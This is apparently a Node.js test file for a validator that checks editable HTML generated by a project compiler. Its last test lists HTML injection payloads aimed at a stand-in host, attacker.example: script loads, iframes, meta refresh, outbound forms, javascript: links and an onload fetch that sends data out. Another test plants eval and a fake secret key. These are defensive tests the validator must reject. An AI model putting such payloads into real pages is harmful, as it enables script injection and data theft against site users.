import assert from "node:assert/strict";
import { registerHooks } from "node:module";
import test from "node:test";

const projectRoot = new URL("../", import.meta.url);

registerHooks({
  resolve(specifier, context, nextResolve) {
    if (!specifier.startsWith("@/")) return nextResolve(specifier, context);
    const projectPath = specifier.slice(2);
    return {
      shortCircuit: true,
      url: new URL(
        projectPath.endsWith(".ts") ? projectPath : `${projectPath}.ts`,
        projectRoot,
      ).href,
    };
  },
});

const { compileProject } = await import("../lib/project-compiler.ts");
const { createProjectSpec } = await import("../lib/project-factory.ts");
const {
  bindPublishedRuntimeHtml,
  prepareEditableRuntimeHtml,
  validateEditableRuntimeHtml,
} = await import(
  "../lib/source-workspace.ts"
);

function project() {
  const spec = createProjectSpec({
    presetId: "crypto-radio",
    values: {},
    prompt: "A five-minute market radio show",
    tools: ["DropsTab market data", "Browser speech"],
    provider: "free",
    model: "Free compiler",
    market: [],
    prediction: {
      title: "Waiting for a verified prediction market",
      probability: null,
      change: null,
    },
    origin: "https://drops.example",
  });
  return { spec, html: compileProject(spec) };
}

test("source workspace accepts the exact generated runnable artifact", () => {
  const { spec, html } = project();
  assert.deepEqual(validateEditableRuntimeHtml(spec, html), {
    valid: true,
    issues: [],
  });
});

test("source workspace removes loopback origins without breaking Studio-local assets", () => {
  const { spec, html } = project();
  const loopback = html
    .replaceAll("https://drops.example", "http://127.0.0.1:4173")
    .replace("</body>", '<aside data-source-proof="true">Manual source</aside></body>');
  const editable = prepareEditableRuntimeHtml(loopback);

  assert.doesNotMatch(editable, /https?:\/\/(?:localhost|127\.0\.0\.1)/i);
  assert.match(editable, /"dataEndpoint":"\/api\/public-data"/);
  assert.match(editable, /src="\/brand\/dropstab-mark\.svg"/);
  assert.deepEqual(validateEditableRuntimeHtml(spec, editable), {
    valid: true,
    issues: [],
  });
});

test("edited runtime binding preserves edits while replacing every Studio service slug", () => {
  const { spec, html } = project();
  const publicSpec = {
    ...spec,
    slug: "public-radio-111111111111111111111111",
    dataEndpoint: "https://drops.example/api/public-data",
  };
  const edited = html.replace(
    "</body>",
    '<aside data-user-edit="true">Keep this source edit</aside></body>',
  );
  const rebound = bindPublishedRuntimeHtml(edited, publicSpec);
  const embedded = rebound.match(
    /<script type="application\/json" id="projectSpec">([\s\S]*?)<\/script>/,
  );
  assert.ok(embedded);
  assert.equal(JSON.parse(embedded[1]).slug, publicSpec.slug);
  assert.equal(JSON.parse(embedded[1]).dataEndpoint, publicSpec.dataEndpoint);
  assert.match(rebound, /data-user-edit="true"/);
  assert.match(
    rebound,
    new RegExp(`var studioTelegramUrl="https://drops\\.example/\\?connections=1&provider=dropsbot&flow=telegram-channel&project=${publicSpec.slug}"`),
  );
  assert.deepEqual(validateEditableRuntimeHtml(publicSpec, rebound), {
    valid: true,
    issues: [],
  });
});

test("edited runtime binding treats Telegram URL replacement markers literally", () => {
  const { spec, html } = project();
  const publicSpec = {
    ...spec,
    slug: "public-radio-replacement-proof",
    dataEndpoint: "https://drops$&.example/api/public-data",
  };
  const rebound = bindPublishedRuntimeHtml(html, publicSpec);

  assert.match(
    rebound,
    /var studioTelegramUrl="https:\/\/drops\$&\.example\/\?connections=1&provider=dropsbot&flow=telegram-channel&project=public-radio-replacement-proof";/,
  );
  assert.doesNotMatch(rebound, /var studioTelegramUrl=https:\/\/dropsvar studioTelegramUrl=/);
});

test("edited runtime binding fails closed when a compiler-owned bridge value is missing", () => {
  const { spec, html } = project();
  const publicSpec = { ...spec, slug: "public-radio-safe" };
  assert.throws(
    () => bindPublishedRuntimeHtml(
      html.replace('<script type="application/json" id="projectSpec">', "<script>"),
      publicSpec,
    ),
    /exactly one generated projectSpec payload/,
  );
  assert.throws(
    () => bindPublishedRuntimeHtml(
      html.replace(/\bvar studioTelegramUrl=("(?:\\.|[^"\\])*");/, ""),
      publicSpec,
    ),
    /generated Telegram handoff binding/,
  );
});

test("source workspace blocks secrets, evaluators, loopback dependencies and removed contracts", () => {
  const { spec, html } = project();
  const unsafe = html
    .replace(`data-project-kind="${spec.presetId}"`, "")
    .replace("</body>", '<script>eval("1")</script><a href="http://localhost:3000">local</a><p>sk-proj-abcdefghijklmnopqrstuvwxyz1234567890</p></body>');
  const result = validateEditableRuntimeHtml(spec, unsafe);
  assert.equal(result.valid, false);
  assert.match(result.issues.join(" "), /product-kind|eval|loopback|secret/i);
});

test("source workspace rejects extra active content while preserving the generated JSON payload", () => {
  const { spec, html } = project();
  assert.match(html, /<script type="application\/json" id="projectSpec">/);

  const attacks = [
    '<script src="https://attacker.example/steal.js"></script>',
    '<!--><script src="https://attacker.example/comment-break.js"></script>-->',
    '<script type="importmap">{"imports":{"x":"https://attacker.example/x.js"}}</script>',
    '<iframe src="https://attacker.example/collect"></iframe>',
    '<object data="https://attacker.example/collect"></object>',
    '<embed src="https://attacker.example/collect">',
    '<base href="https://attacker.example/">',
    '<link rel="modulepreload" href="https://attacker.example/module.js">',
    '<link rel="preload" as="script" href="https://attacker.example/app.js">',
    '<link rel="preconnect" href="https://attacker.example">',
    '<link rel="dns-prefetch" href="//attacker.example">',
    '<link rel="stylesheet" href="https://attacker.example/app.css">',
    '<meta http-equiv="refresh" content="0;url=https://attacker.example/collect">',
    '<form action="https://attacker.example/collect"><input name="secret"></form>',
    '<input formaction="javascript:location=\'https://attacker.example/\'">',
    '<a href="javascript:location=\'https://attacker.example/\'">Open</a>',
    '<img src="/brand/dropstab-mark.svg" onload="fetch(\'https://attacker.example/collect\')">',
  ];

  for (const attack of attacks) {
    const result = validateEditableRuntimeHtml(
      spec,
      html.replace("</body>", `${attack}</body>`),
    );
    assert.equal(result.valid, false, attack);
    assert.match(result.issues.join("\n"), /active[- ]content|outbound form/i, attack);
  }
});
